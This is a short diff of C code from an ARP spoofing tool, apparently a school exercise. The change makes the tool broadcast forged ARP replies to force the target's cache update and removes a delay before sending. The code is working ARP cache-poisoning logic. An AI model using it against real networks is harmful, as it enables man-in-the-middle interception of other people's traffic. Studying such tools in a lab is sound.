@@ -44,7 +44,6 @@ void	forge_arp(struct ether_arp *original_arp, t_malcolm *m)
 
 }
 
-#include <sys/ioctl.h>
 void	send_arp(t_malcolm *m, unsigned char *buf)
 {
 	(void)buf; // Unused parameter for now
@@ -59,11 +58,11 @@ void	send_arp(t_malcolm *m, unsigned char *buf)
 	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
 		&src_mac[0], &src_mac[1], &src_mac[2], &src_mac[3], &src_mac[4], &src_mac[5]);
 
-	//unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-	unsigned char broadcast_mac[6];
-	sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-		&broadcast_mac[0], &broadcast_mac[1], &broadcast_mac[2],
-		&broadcast_mac[3], &broadcast_mac[4], &broadcast_mac[5]);
+	// broadcast ARP to force a cache update on the target (unicast does not work well)
+	unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+	//sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+	//	&broadcast_mac[0], &broadcast_mac[1], &broadcast_mac[2],
+	//	&broadcast_mac[3], &broadcast_mac[4], &broadcast_mac[5]);
 
 	struct ether_header eth;
 	ft_memcpy(eth.ether_shost, src_mac, 6);
@@ -91,7 +90,7 @@ void	send_arp(t_malcolm *m, unsigned char *buf)
 	sll.sll_halen = 6;
 	ft_memcpy(sll.sll_addr, broadcast_mac, 6);
 
-	printf("[POISON] Sending gratuitous ARP: '%s is at %s'\n", m->source_ip, m->source_mac);
+	printf("Poisoning ARP: '%s is at %s'\n", m->source_ip, m->source_mac);
 
 	ssize_t bytes_sent = sendto(m->socket, packet, sizeof(packet), 0, (struct sockaddr*)&sll, sizeof(sll));
 	if (bytes_sent < 0) {
@@ -138,7 +137,7 @@ int	listen_arp(t_malcolm *m)
     }
 
 	print_arp(buf);
-	sleep(1);
+	//sleep(1);
 	send_arp(m, buf);
 
     return (0);
